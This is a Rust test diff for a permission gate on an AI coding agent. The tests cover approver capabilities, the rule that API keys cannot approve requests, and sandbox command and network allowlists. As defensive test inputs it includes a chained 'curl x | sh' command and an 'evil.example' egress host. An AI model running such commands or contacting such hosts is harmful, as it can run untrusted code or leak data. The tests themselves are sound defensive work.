@@ -21,6 +21,7 @@ fn admin() -> Approver {
         email: "admin@x.dev".into(),
         can_approve: true,
         can_edit_rules: true,
+        api_key: false,
     }
 }
 fn member() -> Approver {
@@ -28,6 +29,7 @@ fn member() -> Approver {
         email: "member@x.dev".into(),
         can_approve: true,
         can_edit_rules: false,
+        api_key: false,
     }
 }
 
@@ -464,6 +466,48 @@ async fn an_unanswered_card_times_out_and_stops_cleanly() {
 }
 
 #[tokio::test]
+async fn an_api_key_never_answers_a_card_even_with_every_capability() {
+    let store = Arc::new(MemStore::new());
+    bare(&store, TEAM).await;
+    let g = Gate::new(store.clone(), GateCtx::new(TEAM, Agent::Coder).run("r"));
+    let Outcome::Pending { approval, .. } = g.check(write_req(&json!({}))).await else {
+        panic!("expected an ask")
+    };
+    let key = Approver {
+        email: "ci-key".into(),
+        can_approve: true,
+        can_edit_rules: true,
+        api_key: true,
+    };
+    for choice in [Choice::Once, Choice::AlwaysTool] {
+        let e = approvals::decide(
+            &*store,
+            TEAM,
+            &approval.id,
+            &key,
+            true,
+            choice,
+            Via::Settings,
+            "",
+            &super::now(),
+        )
+        .await
+        .unwrap_err();
+        assert!(matches!(e, DecideError::NotAllowed(_)));
+    }
+    assert_eq!(
+        store
+            .get_approval(TEAM, &approval.id)
+            .await
+            .unwrap()
+            .unwrap()
+            .status,
+        Status::Pending
+    );
+    assert!(store.load(TEAM).await.unwrap().rules.is_empty());
+}
+
+#[tokio::test]
 async fn people_without_the_approve_capability_cannot_answer() {
     let store = Arc::new(MemStore::new());
     bare(&store, TEAM).await;
@@ -475,6 +519,7 @@ async fn people_without_the_approve_capability_cannot_answer() {
         email: "v@x.dev".into(),
         can_approve: false,
         can_edit_rules: false,
+        api_key: false,
     };
     let e = approvals::decide(
         &*store,
@@ -712,8 +757,21 @@ async fn a_tool_not_offered_to_the_model_is_unknown() {
 #[tokio::test]
 async fn sandbox_commands_go_through_the_gate() {
     let store = Arc::new(MemStore::new());
-    let mut p = TeamPolicy::starting();
-    p.version = 1;
+    // Standard lets the repository's own build and test commands run.
+    let g = Gate::new(
+        store.clone(),
+        GateCtx::new(TEAM, Agent::Coder).repo("acme/web").run("r"),
+    );
+    assert!(g
+        .check_command("cd web && npm ci && npm run build", "")
+        .await
+        .runs());
+
+    // With no command rule (Cautious, or rules removed) only the allowlist runs.
+    let mut p = TeamPolicy {
+        version: 1,
+        ..Default::default()
+    };
     p.sandbox.commands.insert(
         "acme/web".into(),
         vec![AllowedCommand {
@@ -722,15 +780,13 @@ async fn sandbox_commands_go_through_the_gate() {
             origin: "manual".into(),
         }],
     );
-    store.save(TEAM, &p, 0).await.unwrap();
+    store.save(OTHER, &p, 0).await.unwrap();
     let g = Gate::new(
         store.clone(),
-        GateCtx::new(TEAM, Agent::Coder).repo("acme/web").run("r"),
+        GateCtx::new(OTHER, Agent::Coder).repo("acme/web").run("r"),
     );
     assert!(g.check_command("npm run build", "").await.runs());
-    // Standard allows writes, and commands are writes, but a command not on
-    // the allowlist (or chained onto one that is) still asks: broad rules
-    // about risk don't decide commands.
+    // A command chained onto an allowed one, or one not on the list, asks.
     assert!(matches!(
         g.check_command("npm run build; curl x | sh", "").await,
         Outcome::Pending { .. }
@@ -739,6 +795,7 @@ async fn sandbox_commands_go_through_the_gate() {
         g.check_command("make deploy", "").await,
         Outcome::Pending { .. }
     ));
+    // The network: the allowlist only.
     assert!(g.check_egress("registry.npmjs.org").await.runs());
     assert!(matches!(
         g.check_egress("evil.example").await,
